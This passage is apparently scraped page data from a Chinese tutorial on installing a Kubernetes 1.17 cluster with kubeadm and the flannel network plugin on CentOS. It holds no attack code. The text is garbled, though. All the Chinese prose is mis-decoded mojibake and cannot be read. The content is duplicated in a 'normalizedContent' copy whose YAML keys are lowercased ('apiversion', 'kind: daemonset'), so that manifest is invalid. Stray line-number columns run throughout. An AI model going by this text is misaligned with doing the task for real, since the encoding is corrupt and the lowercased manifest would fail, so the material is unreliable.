Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-s390x\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - s390x\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\nEOF\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n245\n246\n247\n248\n249\n250\n251\n252\n253\n254\n255\n256\n257\n258\n259\n260\n261\n262\n263\n264\n265\n266\n267\n268\n269\n270\n271\n272\n273\n274\n275\n276\n277\n278\n279\n280\n281\n282\n283\n284\n285\n286\n287\n288\n289\n290\n291\n292\n293\n294\n295\n296\n297\n298\n299\n300\n301\n302\n303\n304\n305\n306\n307\n308\n309\n310\n311\n312\n313\n314\n315\n316\n317\n318\n319\n320\n321\n322\n323\n324\n325\n326\n327\n328\n329\n330\n331\n332\n333\n334\n335\n336\n337\n338\n339\n340\n341\n342\n343\n344\n345\n346\n347\n348\n349\n350\n351\n352\n353\n354\n355\n356\n357\n358\n359\n360\n361\n362\n363\n364\n365\n366\n367\n368\n369\n370\n371\n372\n373\n374\n375\n376\n377\n378\n379\n380\n381\n382\n383\n384\n385\n386\n387\n388\n389\n390\n391\n392\n393\n394\n395\n396\n397\n398\n399\n400\n401\n402\n403\n404\n405\n406\n407\n408\n409\n410\n411\n412\n413\n414\n415\n416\n417\n418\n419\n420\n421\n422\n423\n424\n425\n426\n427\n428\n429\n430\n431\n432\n433\n434\n435\n436\n437\n438\n439\n440\n441\n442\n443\n444\n445\n446\n447\n448\n449\n450\n451\n452\n453\n454\n455\n456\n457\n458\n459\n460\n461\n462\n463\n464\n465\n466\n467\n468\n469\n470\n471\n472\n473\n474\n475\n476\n477\n478\n479\n480\n481\n482\n483\n484\n485\n486\n487\n488\n489\n490\n491\n492\n493\n494\n495\n496\n497\n498\n499\n500\n501\n502\n503\n504\n505\n506\n507\n508\n509\n510\n511\n512\n513\n514\n515\n516\n517\n518\n519\n520\n521\n522\n523\n524\n525\n526\n527\n528\n529\n530\n531\n532\n533\n534\n535\n536\n537\n538\n539\n540\n541\n542\n543\n544\n545\n546\n547\n548\n549\n550\n551\n552\n553\n554\n555\n556\n557\n558\n559\n560\n561\n562\n563\n564\n565\n566\n567\n568\n569\n570\n571\n572\n573\n574\n575\n576\n577\n578\n579\n580\n581\n582\n583\n584\n585\n586\n587\n588\n589\n590\n591\n592\n593\n594\n595\n596\n597\n598\n599\n600\n601\n602\n603\n604\n\n\næ§è¡ä»¥ä¸å½ä»¤\n\nkubectl apply -f kube-flannel.yml \n\n\n1\n\n\næ¥çèç¹ç¶æï¼åªè¦ä» NotReady å° Ready å°±ç®æå\n\n\n# æå¡é¨ç½²\n\né¨ç½²ä¸ä¸ª nginx ç¨åºï¼æµè¯ä¸éç¾¤æ¯å¦å¨æ­£å¸¸å·¥ä½ï¼ç´æ¥å¨ master æä½\n\n# é¨ç½²nginx\nkubectl create deployment nginx --image=nginx:1.14-alpine\n# æ´é²ç«¯å£\nkubectl expose deployment nginx --port=80 --type=NodePort\n\n# æ¥çæå¡ç¶æ\n[root@localhost package]# kubectl get pods,svc\nNAME                         READY   STATUS    RESTARTS   AGE\npod/nginx-6867cdf567-2l7tr   1/1     Running   0          50s\n\nNAME                 TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE\nservice/kubernetes   ClusterIP   10.96.0.1        <none>        443/TCP        71m\nservice/nginx        NodePort    10.101.119.180   <none>        80:31543/TCP   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n31543 è¿ä¸ªç«¯å£å°±æ¯å¤é¨ç«¯å£ï¼å¯ä»¥éè¿èç¹åç§° + ç«¯å£å·ç´æ¥è®¿é®æµè¯',normalizedContent:'# 1 åç½®ç¥è¯ç¹\n\nkubernetes éç¾¤å¤§ä½ä¸åä¸ºä¸¤ç±»ï¼ä¸ä¸»å¤ä» å å¤ä¸»å¤ä»ã\n\n * ä¸ä¸»å¤ä»ï¼ä¸å° mater èç¹åå¤å° node èç¹ï¼æ­å»ºç®åï¼ä½æ¯ç±åæºæéé£é©ï¼éåç¨äºæµè¯ç¯å¢\n * å¤ä¸»å¤ä»ï¼å¤å° master èç¹åå¤å° node èç¹ï¼æ­å»ºéº»ç¦ï¼å®å¨æ§é«ï¼éç¨äºçäº§ç¯å¢ã\n\n\n\n\n# 1.2 å®è£æ¹å¼\n\nkubernetes å¤æå¤ç§é¨ç½²æ¹å¼ï¼ç®åä¸»æµçæ¹å¼ç± kubeadmãminikubeãäºè¿å¶å\n\n * minikubeï¼ä¸ä¸ªç¨äºå¿«éæ­å»ºåèç¹ kubernetes çå·¥å·\n * kubeadmï¼ä¸ä¸ªç¨å¿«éæ­å»º kubernetes éç¾¤çå·¥å·\n * äºè¿å¶åï¼ä»å®ç½ä¸è½½æ¯ä¸ªç»ä»¶çäºè¿å¶åï¼ä»¥æ­¤å»å®è£ï¼æ­¤æ¹å¼å¯¹äºçè§£ kubernetes ç»ä»¶æ´å ææ\n\n> æ°ææ¨è kubeadm\n\n\n# 1.3 kubeadm é¨ç½²æ¹å¼ä»ç»\n\nkubeadm æ¯å®æ¹ç¤¾åºæ¨åºçä¸ä¸ªç¨äºå¿«éé¨ç½² kubernetes éç¾¤çå·¥å·ï¼è¿ä¸ªå·¥å·è½éè¿ä¸¤æ¡æä»¤å®æä¸ä¸ª kubernetes éç¾¤çé¨ç½²ï¼\n\n * åå»ºä¸ä¸ª master èç¹ kubeadm init\n * å° node èç¹å å¥å°å½åéç¾¤ä¸­ $ kubeadm join <master èç¹ç ip åç«¯å£>\n\n> kubeadm å®è£éç¾¤è¦æ± centos7.5 åä»¥ä¸\n\n\n# 1.4 å®è£è¦æ±\n\nå¨å¼å§ä¹åï¼é¨ç½² kubernetes éç¾¤æºå¨éè¦æ»¡è¶³ä»¥ä¸å ä¸ªæ¡ä»¶ï¼\n\n * ä¸å°æå¤å°æºå¨ï¼æä½ç³»ç» centos7.x-86_x64\n * ç¡¬ä»¶éç½®ï¼2gb ææ´å¤ ramï¼2 ä¸ª cpu ææ´å¤ cpuï¼ç¡¬ç 30gb ææ´å¤\n * éç¾¤ä¸­æææºå¨ä¹é´ç½ç»äºé\n * å¯ä»¥è®¿é®å¤ç½ï¼éè¦æåéå\n * ç¦æ­¢ swap ååº\n\n\n# 1.5 æç»ç®æ \n\n * å¨ææèç¹ä¸å®è£ docker å kubeadm\n * é¨ç½² kubernetes master\n * é¨ç½²å®¹å¨ç½ç»æä»¶\n * é¨ç½² kubernetes nodeï¼å°èç¹å å¥ kubernetes éç¾¤ä¸­\n * é¨ç½² dashboard web é¡µé¢ï¼å¯è§åæ¥ç kubernetes èµæº\n\n\n# 2 å®è£é¨ç½²\n\n\n\nè§è²       hostname   ip               ç»ä»¶\nmaster   node101    192.168.81.101   dockerï¼kubectlï¼kubeadmï¼kubelet\nnode1    node102    192.168.81.102   dockerï¼kubectlï¼kubeadmï¼kubelet\nnode2    node103    192.168.81.103   dockerï¼kubectlï¼kubeadmï¼kubelet\n\n> ä»¥ä¸æ²¡æç¹å®è¯´æå¨ master è¿æ¯ node ä¸æä½ï¼é»è®¤å¨é¨èç¹éè¦æä½ã\n\n\n# 2.1 hostname åè§£æ\n\nä¸ç®¡æ­å»ºè®¾ä»ä¹éç¾¤ï¼åè®°è®¾ç½®å¥½ hostnameï¼æ¯è¾æ¹ä¾¿ãä¸¤ä¸ªæ­¥éª¤å®æè®¾ç½®ï¼\n\n 1. ä¸´æ¶è®¾ç½®ãhostname èç¹åç§°\n 2. vim /etc/hostname\n\nè®¾ç½®å®æåè¦æ·»å è§£æ hostname ä¸»æºåç ip æ å°ï¼vim /etc/hosts ç´æ¥ä¿®æ¹\n\n192.168.81.101  node101\n192.168.81.102  node102\n192.168.81.103  node103  \n\n\n1\n2\n3\n\n\nhostname node101\n\nvim /etc/hostname\nnode101\n\n\n1\n2\n3\n4\n\n\n\n# 2.2 æ¶é´åæ­¥\n\nkubernetes è¦æ±æ®ç¾¤ä¼çèç¹æ¶é´å¿é¡»ç²¾ç¡®ä¸è´ï¼è¿éç´æ¥ä½¿ç¨ chronyd æå¡ä»ç½ç»åæ­¥æ¶é´ãä¼ä¸ä¸­å»ºè®®éç½®åé¨çæ¶é´åæ­¥æå¡å¨ã\n\n# å¯å¨chronydæå¡\nsystemctl start chronyd\n# è®¾ç½®chronydæå¡å¼æºèªå¯å¨\nsystemctl enable chronyd\n# chronyd æå¡å¯å¨ç¨ç­å ç§éï¼å°±å¯ä»¥ä½¿ç¨dataå½ä»¤éªè¯æ¶é´äº\ndate\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.3 ç¦ç¨ iptables å firewalld æå¡\n\nkubernetes å docker å¨è¿è¡ä¸­ä¼äº§çå¤§éç iptables è§åï¼ä¸ºäºä¸è®©ç³»ç»è§åè·ä»ä»¬æ··æ·ï¼ç´æ¥å³é­ç³»ç»çè§åï¼çäº§ç³»ç»å»ºè®®å¼å¯ï¼éè¦å¼æ¾åªäºç«¯å£æè ipï¼æå¨éç½®ã\n\n# å³é­ firewalld æå¡\nsystemctl stop firewalld\nsystemctl disable firewalld\n# å³é­iptanlesæå¡\nsystemctl stop iptables\nsystemctl disable iptables\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.4 ç¦ç¨ selinux\n\nselinux æ¯ linux ç³»ç»ä¸çä¸ä¸ªå®å¨æå¡ï¼å¦æä¸å³é­å®ï¼å¨å®è£éç¾¤ä¸­å¯è½ä¼è¢«éå¶\n\n# ä¸´æ¶å³é­\nsetenforce 0\n# æ°¸ä¹ç¦ç¨\nvim /etc/selinux/config\nselinux=disabled\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.5 ç¦ swap ç¨ååº\n\nswap ååºæçæ¯èæåå­ååºï¼å®çä½ç¨æ¯å¨ç©çåå­ä½¿ç¨å®ä¹åï¼å°ç£çç©ºé´èææåå­æ¥ä½¿ç¨ï¼å¯ç¨ swap è®¾å¤ä¼å¯¹ç³»ç»çæ§è½äº§çéå¸¸è´é¢çå½±åï¼å æ­¤ kubernetes è¦æ±æ¯ä¸ªèç¹é½è¦ç¦ç¨ swap è®¾å¤ï¼ä½æ¯å¦æå ä¸ºæäºåå ç¡®å®ä¸è½å³é­ swap ååºï¼å°±éè¦å¨éç¾¤å®è£çè¿ç¨ä¸­éè¿æç¡®çåæ°è¿è¡éç½®è¯´æã\n\n# ä¸´æ¶å³é­\nswapoff -a\n\n# æ°¸ä¹å³é­ï¼ç¼è¾ååºéç½®æä»¶ /etc/fstabï¼æ³¨éæ wap ååºä¸è¡\n#/dev/mapper/centos-swap swap                    swap    defaults        0 0\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.6 ä¿®æ¹ linxu çåæ ¸åæ°\n\n# ä¿®æ¹linuxçåæ ¸åæ°ï¼æ·»å ç½æ¡¥è¿æ»¤åå°åè½¬ååè½\n# ç¼è¾ /etc/sysctl.d/k8s.conf æä»¶ï¼æ·»å å¦ä¸éç½®ï¼\nnet.bridge.bridge-nf-call-iptables=1\nnet.bridge.bridge-nf-call-ip6tables=1\nnet.ipv4.ip_forward=1\nnet.ipv4.tcp_tw_recycle=0\nvm.swappiness=0\nvm.overcommit_memory=1\nvm.panic_on_oom=0\nfs.inotify.max_user_watches=89100\nfs.file-max=52706963\nfs.nr_open=52706963\nnet.ipv6.conf.all.disable_ipv6=1\nnet.netfilter.nf_conntrack_max=2310720\n\n# å è½½ç½æ¡¥è¿æ»¤æ¨¡å\nmodprobe br_netfilter\nmodprobe ip_conntrack\n# éç½®å®æåéæ°å è½½éç½®æä»¶\nsysctl -p /etc/sysctl.d/k8s.conf\n# æ¥çç½æ¡¥è¿æ»¤æ¨¡åæ¯å¦æ·»å æå\nlsmod | grep br_netfilter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.7 éç½® ipvs\n\nå¨ kubernetes ä¸­ service æä¸¤ç§ä»£çæ¨¡åï¼ä¸ç§æ¯åºäº iptables çï¼ä¸ç§æ¯åºäº ipvs çï¼ä¸¤èæ¯è¾çè¯ï¼ipvs çæ§è½ææ¾æ´è¦é«ä¸äºï¼ä½æ¯å¦æè¦ä½¿ç¨å®ï¼éè¦æå¨è½½å¥ ipvs æ¨¡å\n\n# å®è£ ipset å ipvsadm \nyum install ipset ipvsadm -y\n\n# æ·»å éè¦å è½½å¾æ¨¡ååå¥èæ¬æä»¶\ncat <<eof > /etc/sysconfig/modules/ipvs.modules\n#!/bin/bash\nmodprobe -- ip_vs\nmodprobe -- ip_vs_rr\nmodprobe -- ip_vs_wrr\nmodprobe -- ip_vs_sh\nmodprobe -- nf_conntrack_ipv4\nmodprobe -- br_netfilter\neof\n\n# ä¸ºèæ¬æä»¶æ·»å æ§è¡æé\nchmod +x /etc/sysconfig/modules/ipvs.modules\n\n# æ§è¡èæ¬æä»¶\n/bin/bash /etc/sysconfig/modules/ipvs.modules\n\n# æ¥çå¯¹åºå¾æ¨¡åæ¯å¦å è½½æå\nlsmod | grep -e ip_vs -e nf_conntrack_ipv4\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.8 docker å®è£\n\n# ä¹åå®è£è¿docker å¸è½½\nyum remove docker-*\n\n# æ´æ¢éåå°å\nwget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -o /etc/yum.repos.d/docker-ce.repo\n\n# æ£æ¥æ¯æçæ¬\nyum list docker-ce --showduplicates | sort -r\n\n# å®è£\nyum install --setopt=obsoletes=0 docker-ce-18.06.3.ce-3.el7\n\n# æ·»å ä¸ä¸ªéç½®æä»¶ï¼dockerå¨é»è®¤æåµä¸ä½¿ç¨çcgroup driverä¸ºcgroupfsï¼èkubernetesæ¨èä½¿ç¨systemdæ¥ä»£æ¿cgroupfs\ncat > /etc/docker/daemon.json <<eof\n{\n  "registry-mirrors": ["https://bk6kzfqm.mirror.aliyuncs.com"],\n  "data-root": "/data/docker",\n  "exec-opts": ["native.cgroupdriver=systemd"],\n  "log-driver": "json-file",\n  "log-opts": {\n    "max-size": "100m"\n  },\n  "storage-driver": "overlay2",\n  "storage-opts": [\n    "overlay2.override_kernel_check=true"\n  ]\n}\neof\n\n# å¯å¨docker\nsystemctl restart docker\nsystemctl enable docker\n\n#æ£æ¥çæ¬\ndocker version\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 2.9 å®è£ kubernetes ç»ä»¶\n\nç±äº kubernetes çéåæºå¨å½å¤ï¼éåº¦æ¯è¾æ¢ï¼è¿éåæ¢æå½åçéåæº\n\n# æ·»å éç½®æä»¶\nvim /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=kubernetes\nbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=0\nrepo_gpgcheck=0\ngpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå®è£ kubeadmãkubelet å kubectl\n\nyum install --setopt=obsoletes=0 kubeadm-1.17.4-0 kubelet-1.17.4-0 kubectl-1.17.4-0\n\n\n1\n\n\nè®¾ç½® kubelet å¼æºèªå¯å¨\n\nsystemctl enable kubelet\n\n\n1\n\n\n\n# 2.10 éç¾¤åå§å\n\n# åå¤éå\n\nkubeadm config images list\n\nimages=(\n    kube-apiserver:v1.17.4\n    kube-controller-manager:v1.17.4\n    kube-scheduler:v1.17.4\n    kube-proxy:v1.17.4\n    pause:3.1\n    etcd:3.4.3-0\n    coredns:1.6.5\n)\n\n\nfor imagename in ${images[@]} ;do\n    docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/$imagename\n    docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/$imagename k8s.gcr.io/$imagename\n    docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/$imagename\ndone\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå§å\n\nå¨ master ç¹æä½å¦ä¸\n\nkubeadm init \\\n  --kubernetes-version=v1.17.4 \\\n  --pod-network-cidr=10.244.0.0/16 \\\n  --service-cidr=10.96.0.0/12  \\\n  --apiserver-advertise-address=10.240.30.113\n\n\n1\n2\n3\n4\n5\n\n * kubernetes-version ä¸ºçæ¬\n * pod-network-cidr æå® pod ç½ç»\n * service-cidr æå® service ç½ç»\n * apiserver-advertise-address æå® master ç ip å°å\n * image-repository registry.aliyuncs.com/google_containers æå®éåæºä¸ºé¿éï¼åé¢å·²ç»æåè¿éåäºï¼æä»¥ä¸éè¦å¨æ\n\n# å®è£è¿ç¨ä¸­æ¥éå¦ææ¥éï¼æ¥çæ¥å¿\njournalctl -xfeu kubelet\n\n# éç½® kubeadm çä¿¡æ¯\nkubeadm reset\n\n\n1\n2\n3\n4\n5\n\n\nå¨ master ç¹åå»ºå¿è¦çæä»¶ï¼æ¯ kubectl ä»¥åè¦æ§è¡çéç½®æä»¶\n\n  mkdir -p $home/.kube\n  sudo cp -i /etc/kubernetes/admin.conf $home/.kube/config\n  sudo chown $(id -u):$(id -g) $home/.kube/config\n\n\n1\n2\n3\n\n\nå¶ä»å­èç¹æ§è¡ï¼å®è£æååä¼æä¿¡æ¯åè¯ä½ \n\nkubeadm join 192.168.81.101:6443 --token d5ejth.9s60snjt5xlh9lnt \\\n    --discovery-token-ca-cert-hash sha256:04aab4993001f66f607e959b120294eddcc8579a5ea7d7364f48d84caecc90c9\n\n\n1\n2\n\n\næ¥çææèç¹\n\nkubectl get nodes\n\n\n1\n\n\n\n# 2.11 å®è£ç½ç»æä»¶\n\nkubernetes æ¯æå¤ç§ç½ç»æä»¶ï¼æ¯å¦ flannelãcalicoãcanal ç­ç­ï¼ä»»éä¸ç§ä½¿ç¨å³å¯ï¼æ¬æ¬¡éæ© flannel\n\n# master æä½\n\nåå»ºæä»¶ï¼å¤å¶æ§åå®¹å°æä»¶ä¸­\n\ncat <<eof > kube-flannel.yml\n---\napiversion: policy/v1beta1\nkind: podsecuritypolicy\nmetadata:\n  name: psp.flannel.unprivileged\n  annotations:\n    seccomp.security.alpha.kubernetes.io/allowedprofilenames: docker/default\n    seccomp.security.alpha.kubernetes.io/defaultprofilename: docker/default\n    apparmor.security.beta.kubernetes.io/allowedprofilenames: runtime/default\n    apparmor.security.beta.kubernetes.io/defaultprofilename: runtime/default\nspec:\n  privileged: false\n  volumes:\n    - configmap\n    - secret\n    - emptydir\n    - hostpath\n  allowedhostpaths:\n    - pathprefix: "/etc/cni/net.d"\n    - pathprefix: "/etc/kube-flannel"\n    - pathprefix: "/run/flannel"\n  readonlyrootfilesystem: false\n  # users and groups\n  runasuser:\n    rule: runasany\n  supplementalgroups:\n    rule: runasany\n  fsgroup:\n    rule: runasany\n  # privilege escalation\n  allowprivilegeescalation: false\n  defaultallowprivilegeescalation: false\n  # capabilities\n  allowedcapabilities: [\'net_admin\']\n  defaultaddcapabilities: []\n  requireddropcapabilities: []\n  # host namespaces\n  hostpid: false\n  hostipc: false\n  hostnetwork: true\n  hostports:\n  - min: 0\n    max: 65535\n  # selinux\n  selinux:\n    # selinux is unused in caasp\n    rule: \'runasany\'\n---\nkind: clusterrole\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nrules:\n  - apigroups: [\'extensions\']\n    resources: [\'podsecuritypolicies\']\n    verbs: [\'use\']\n    resourcenames: [\'psp.flannel.unprivileged\']\n  - apigroups:\n      - ""\n    resources:\n      - pods\n    verbs:\n      - get\n  - apigroups:\n      - ""\n    resources:\n      - nodes\n    verbs:\n      - list\n      - watch\n  - apigroups:\n      - ""\n    resources:\n      - nodes/status\n    verbs:\n      - patch\n---\nkind: clusterrolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nroleref:\n  apigroup: rbac.authorization.k8s.io\n  kind: clusterrole\n  name: flannel\nsubjects:\n- kind: serviceaccount\n  name: flannel\n  namespace: kube-system\n---\napiversion: v1\nkind: serviceaccount\nmetadata:\n  name: flannel\n  namespace: kube-system\n---\nkind: configmap\napiversion: v1\nmetadata:\n  name: kube-flannel-cfg\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\ndata:\n  cni-conf.json: |\n    {\n      "name": "cbr0",\n      "cniversion": "0.3.1",\n      "plugins": [\n        {\n          "type": "flannel",\n          "delegate": {\n            "hairpinmode": true,\n            "isdefaultgateway": true\n          }\n        },\n        {\n          "type": "portmap",\n          "capabilities": {\n            "portmappings": true\n          }\n        }\n      ]\n    }\n  net-conf.json: |\n    {\n      "network": "10.244.0.0/16",\n      "backend": {\n        "type": "vxlan"\n      }\n    }\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-amd64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - amd64\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n            add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-arm64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - arm64\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-arm\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: 